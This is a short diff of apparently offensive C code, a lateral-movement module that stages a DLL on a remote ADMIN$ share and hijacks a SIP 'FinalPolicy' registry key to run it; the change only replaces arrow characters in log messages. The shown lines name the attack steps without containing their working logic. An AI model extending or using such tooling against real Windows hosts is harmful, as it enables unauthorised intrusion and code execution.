@@ -156,7 +156,7 @@ static BOOL upload_dll(const char *target, const char *share, const char *dll_na
         return FALSE;
     }
 
-    TMB_INFO("Uploaded %d bytes → %s", dll_len, remote_path_out);
+    TMB_INFO("Uploaded %d bytes -> %s", dll_len, remote_path_out);
     return TRUE;
 }
 
@@ -224,7 +224,7 @@ static BOOL hijack_finalpolicy(const char *target, const char *guid,
     ADVAPI32$RegCloseKey(hKey);
     ADVAPI32$RegCloseKey(hRemote);
 
-    TMB_INFO("FinalPolicy hijacked: $DLL → %s", payload_path);
+    TMB_INFO("FinalPolicy hijacked: $DLL -> %s", payload_path);
     return TRUE;
 }
 
@@ -526,7 +526,7 @@ extern "C" void go(char *args, int alen) {
     if (!share || !*share) share = (char*)"ADMIN$";
     const char *guid = resolve_guid(guid_alias);
 
-    TMB_INFO("SIPExec %s → %s (FinalPolicy: %s)",
+    TMB_INFO("SIPExec %s -> %s (FinalPolicy: %s)",
              mode == 0 ? "jump" : "remote-exec", target, guid);
 
     /* ---- Phase 1: Stage DLL ---- */
